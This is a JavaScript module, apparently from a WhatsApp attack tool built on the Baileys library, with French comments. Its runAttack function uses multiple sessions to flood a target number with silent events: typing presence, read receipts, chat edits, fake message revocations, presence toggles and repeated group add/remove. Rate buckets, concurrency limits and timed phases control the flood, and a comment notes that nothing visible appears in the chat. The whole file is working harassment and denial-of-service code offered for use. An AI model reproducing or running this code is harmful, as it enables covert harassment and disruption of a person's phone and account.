'use strict'
const crypto = require('crypto')
const { generateMessageIDV2 } = require('@whiskeysockets/baileys')
const config = require('./config')

const delay = (ms) => new Promise((r) => setTimeout(r, ms))
const noop = () => {}
const newId = () => typeof generateMessageIDV2 === 'function'
  ? generateMessageIDV2()
  : crypto.randomBytes(10).toString('hex').toUpperCase()

function toJid(raw) {
  const d = String(raw).replace(/\D/g, '')
  if (d.length < 8) throw new Error('numéro invalide')
  return `${d}@s.whatsapp.net`
}

/* Modules : aucun message visible dans la conversation */
const modules = {
  async presence(sock, jid, n) {
    if (n % 12 === 0) await sock.presenceSubscribe(jid)
    await sock.sendPresenceUpdate('composing', jid)
    await sock.sendPresenceUpdate('paused', jid)
  },
  async receipt(sock, jid) {
    await sock.sendReceipt(jid, undefined, [newId()], 'read')
  },
  async chatmodify(sock, jid) {
    const key = { remoteJid: jid, fromMe: true, id: newId() }
    await sock.chatModify(
      { markRead: true, lastMessages: [{ key, messageTimestamp: Math.floor(Date.now() / 1000) }] },
      jid
    )
  },
  async revoke(sock, jid) {
    await sock.sendMessage(jid, { delete: { remoteJid: jid, fromMe: true, id: newId() } })
  },
  async globalPresence(sock, _jid, n) {
    if (n % 8 !== 0) return
    await sock.sendPresenceUpdate('available')
    await sock.sendPresenceUpdate('unavailable')
  },
  async group(sock, jid, _n, ctx) {
    if (!ctx.groupId) return
    const op = ctx.flip ? 'remove' : 'add'
    ctx.flip = !ctx.flip
    await sock.groupParticipantsUpdate(ctx.groupId, [jid], op)
  }
}

class Bucket {
  constructor(rate, burst) { this.rate = rate; this.cap = burst; this.tokens = burst; this.last = Date.now() }
  take() {
    const now = Date.now()
    this.tokens = Math.min(this.cap, this.tokens + ((now - this.last) / 1000) * this.rate)
    this.last = now
    if (this.tokens >= 1) { this.tokens -= 1; return true }
    return false
  }
  setRate(r) { this.rate = r }
}

function makePump(max = 48) {
  let n = 0
  return async (fn) => {
    while (n >= max) await delay(4)
    n++
    fn().catch(noop).finally(() => { n-- })
  }
}

async function worker(sess, jid, bucket, mods, signal, stats, ctx) {
  const pump = makePump()
  let i = 0
  while (!signal.aborted) {
    if (!sess.ready) { await delay(250); continue }
    if (!bucket.take()) { await delay(4); continue }
    stats.ops++
    await pump(() => mods[i % mods.length](sess.sock, jid, i++, ctx))
  }
}

async function runAttack({
  target, durationMs, labels = [], activeModules = config.defaultModules,
  groupId = null, onProgress = noop, signal, manager
}) {
  const jid = toJid(target)
  const chosen = labels.map((l) => manager.get(l)).filter((s) => s && s.ready)
  if (!chosen.length) throw new Error('aucune session en ligne')

  const probe = chosen[0]
  const chk = await probe.sock.onWhatsApp(jid).catch(() => null)
  if (chk && (!chk.length || !chk[0]?.exists)) return { status: 'absent', ops: 0, usedLabels: [] }

  const mods = activeModules.map((m) => modules[m]).filter(Boolean)
  if (!mods.length) throw new Error('aucun module valide')

  const share = Math.max(8, Math.floor(config.ratePerSession / chosen.length))
  const buckets = chosen.map(() => new Bucket(share, config.burstPerSession))
  const stats = { ops: 0 }
  const ctx = { groupId, flip: false }
  const started = Date.now()

  const workers = chosen.map((s, i) => worker(s, jid, buckets[i], mods, signal, stats, ctx))

  const totalMs = config.phases.reduce((a, p) => a + p.ms, 0)
  const scale = durationMs / totalMs

  for (const phase of config.phases) {
    if (signal.aborted) break
    const ms = Math.round(phase.ms * scale)
    buckets.forEach((b) => b.setRate(Math.max(4, Math.floor(share * phase.factor))))
    const end = Date.now() + ms
    while (Date.now() < end) {
      if (stats.ops >= config.maxOps) break
      await delay(400)
      onProgress({
        phase: phase.name, ops: stats.ops,
        elapsedMs: Date.now() - started,
        remainingMs: Math.max(0, end - Date.now())
      })
    }
    if (stats.ops >= config.maxOps) break
  }

  signal.aborted = true
  await Promise.allSettled(workers)

  return {
    status: 'done', ops: stats.ops,
    durationMs: Date.now() - started,
    usedLabels: chosen.map((s) => s.label)
  }
}

module.exports = { runAttack, toJid, MODULE_NAMES: Object.keys(modules) }
